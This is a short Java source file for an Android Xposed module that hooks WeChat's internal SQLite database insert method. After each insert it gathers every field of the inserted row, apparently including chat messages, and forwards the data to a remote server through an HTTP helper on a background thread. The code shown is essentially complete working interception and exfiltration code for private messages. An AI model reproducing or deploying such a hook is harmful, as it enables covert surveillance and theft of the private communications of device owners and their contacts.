package com.example.wechatmessage;

import android.content.ContentValues;
import android.util.Log;

import java.util.Map;

import de.robv.android.xposed.IXposedHookLoadPackage;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedHelpers;
import de.robv.android.xposed.callbacks.XC_LoadPackage;

public class HookUtils implements IXposedHookLoadPackage {
    public void handleLoadPackage(final XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {
        if(lpparam.packageName.equals("com.tencent.mm")){
            XposedHelpers.findAndHookMethod(
                    lpparam.classLoader.loadClass("com.tencent.wcdb.database.SQLiteDatabase"),
                    "insert",
                    String.class,
                    String.class,
                    ContentValues.class,
                    new XC_MethodHook() {
                        @Override
                        protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                            super.beforeHookedMethod(param);
                        }

                        @Override
                        protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                            super.afterHookedMethod(param);
                            ContentValues contentValues = (ContentValues) param.args[2];
                            String msg ="";
                            for (Map.Entry<String,Object> stringObjectEntry : contentValues.valueSet()) {
                                msg+="(\n" + stringObjectEntry.getKey()+":" +stringObjectEntry.getValue()+"\n)";
                            }
                            sendServerMsg(msg);
                        }
                    }
            );
        }
       //Log.d("xiaojianbang", "Hooking...");
    }

    void sendServerMsg(final String msg){
        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpUtils.postMsg(msg);
            }
        }).start();
    }

}
